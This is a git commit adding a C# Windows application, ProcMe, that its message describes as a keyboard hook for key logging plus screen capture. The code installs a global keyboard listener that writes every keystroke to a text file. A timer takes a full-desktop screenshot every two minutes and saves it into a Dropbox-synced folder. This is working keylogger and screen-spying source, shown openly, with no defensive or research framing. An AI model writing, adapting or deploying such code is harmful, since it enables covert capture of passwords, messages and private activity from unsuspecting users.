36a14378f72934184de836e2c647bd0a613c5ae8
srujan.saggam <srujan.saggam@nyu.edu>
2013-12-20 13:12:30 -0500

    Interception of keyboard events by hooking
    Key logging at OS level in windows and capturing screenshots.
    Included documentation as well.

---
+++ ProcMe/ProcMe/App.xaml.cs
@@ -0,0 +1,97 @@
+﻿using MyUtil.Keyboard;
+using System;
+using System.Collections.Generic;
+using System.Configuration;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Forms;
+using System.Windows.Shapes;
+
+namespace ProcMe
+{
+    /// <summary>
+    /// Interaction logic for App.xaml
+    /// </summary>
+    public partial class App : System.Windows.Application
+    {
+       // StreamWriter sw;
+        MyUtil.Keyboard.KeyboardListener KListener = new KeyboardListener();
+        static int i = 0;
+
+        // P/Invoke declarations
+        [DllImport("gdi32.dll")]
+        static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int
+        wDest, int hDest, IntPtr hdcSource, int xSrc, int ySrc, CopyPixelOperation rop);
+        [DllImport("user32.dll")]
+        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDc);
+        [DllImport("gdi32.dll")]
+        static extern IntPtr DeleteDC(IntPtr hDc);
+        [DllImport("gdi32.dll")]
+        static extern IntPtr DeleteObject(IntPtr hDc);
+        [DllImport("gdi32.dll")]
+        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
+        [DllImport("gdi32.dll")]
+        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
+        [DllImport("gdi32.dll")]
+        static extern IntPtr SelectObject(IntPtr hdc, IntPtr bmp);
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetDesktopWindow();
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetWindowDC(IntPtr ptr);
+
+        Timer myTimer = new Timer();
+        StreamWriter sw;
+        private void Application_Startup(object sender, StartupEventArgs e)
+        {
+            KListener.KeyDown += new RawKeyEventHandler(KListener_KeyDown);
+            
+            myTimer.Interval = 120000;
+            myTimer.Tick += myTimer_Tick;
+            myTimer.Start();
+            sw = new StreamWriter("path to txt", false);
+        }
+
+        void myTimer_Tick(object sender, EventArgs e)
+        {
+            System.Drawing.Size sz = Screen.PrimaryScreen.Bounds.Size;
+            IntPtr hDesk = GetDesktopWindow();
+            IntPtr hSrce = GetWindowDC(hDesk);
+            IntPtr hDest = CreateCompatibleDC(hSrce);
+            IntPtr hBmp = CreateCompatibleBitmap(hSrce, sz.Width, sz.Height);
+            IntPtr hOldBmp = SelectObject(hDest, hBmp);
+            bool b = BitBlt(hDest, 0, 0, sz.Width, sz.Height, hSrce, 0, 0, CopyPixelOperation.SourceCopy | CopyPixelOperation.CaptureBlt);
+            Bitmap bmp = Bitmap.FromHbitmap(hBmp);
+            SelectObject(hDest, hOldBmp);
+            DeleteObject(hBmp);
+            DeleteDC(hDest);
+            ReleaseDC(hDesk, hSrce);
+            bmp.Save(@"C:\Users\Srujan\Dropbox\S" + (i++) + ".png");
+            bmp.Dispose();            
+        }
+
+
+
+        void KListener_KeyDown(object sender, RawKeyEventArgs args)
+        {
+            Console.WriteLine(args.Key.ToString());
+
+            sw.Write(args.Key.ToString());
+            sw.Flush();
+        }
+        private void Application_Exit(object sender, ExitEventArgs e)
+        {
+
+            sw.Close();
+            myTimer.Stop();
+            myTimer.Dispose();
+            KListener.Dispose();
+        }
+
+     
+    }
+}
